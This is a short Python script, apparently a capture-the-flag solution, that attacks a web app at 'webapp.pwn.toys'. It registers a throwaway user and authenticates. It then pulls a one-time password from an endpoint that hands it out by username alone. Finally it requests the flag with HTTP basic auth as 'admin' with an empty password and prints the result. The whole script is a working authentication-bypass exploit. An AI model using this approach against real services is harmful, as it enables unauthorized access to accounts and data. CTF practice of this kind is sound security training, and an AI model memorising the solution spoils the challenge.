import requests

# set the base URL for the server
base_url = "https://webapp.pwn.toys"

# register a new user with the server
register_url = f"{base_url}/register"
register_data = {
    "username": "test_user",
    "password": "test_password",
    "description": "test_description"
}
response = requests.post(register_url, json=register_data)

# authenticate as the new user
auth_url = f"{base_url}/auth"
auth_data = {
    "username": "test_user",
    "password": "test_password"
}
response = requests.post(auth_url, json=auth_data)

# get an OTP for the user
otp_url = f"{base_url}/otp/test_user"
response = requests.get(otp_url)
otp = response.text

# send a request to get the flag
flag_url = f"{base_url}/flag/{otp}"
response = requests.get(flag_url, auth=('admin', ''))

# print the flag
print(response.text)
